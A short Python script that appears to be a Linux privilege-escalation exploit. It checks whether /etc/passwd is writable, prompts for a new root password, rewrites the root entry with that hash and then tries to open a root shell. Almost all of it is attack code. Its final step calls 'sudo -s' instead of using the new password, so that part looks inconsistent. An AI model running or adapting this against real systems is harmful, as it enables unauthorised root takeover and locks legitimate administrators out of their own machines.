import os
import crypt
import getpass
import time

# Check if the file is writable
passwd_file = '/etc/passwd'

print("Checking if we have write access...\n")
time.sleep(1)

if os.access(passwd_file, os.W_OK):
    print("[+] Looks like we have write access!\n")
else:
    print("[-] You don't have sufficient permissions to modify the passwd file.")
    exit()

# Prompt the user for a new password
new_password = getpass.getpass("Enter a new password for root: ")

# Encrypt the new password
encrypted_password = crypt.crypt(new_password)
print("\n[+] The new password hash will be: ", encrypted_password)
time.sleep(1)
print("\n[+] Updating /etc/passwd file with the new hash...")
time.sleep(1)

# Replace 'x' with the new encrypted password
with open(passwd_file, 'r') as file:
    lines = file.readlines()

with open(passwd_file, 'w') as file:
    for line in lines:
        if line.startswith('root:'):
            username, password, rest = line.split(':', 2)
            new_line = f'{username}:{encrypted_password}:{rest}'
            file.write(new_line)
        else:
            file.write(line)

print("\n[+] DONE! Attempting to launch new shell as ROOT...\n")
time.sleep(1)

# Switch to root using sudo
os.system('sudo -s')

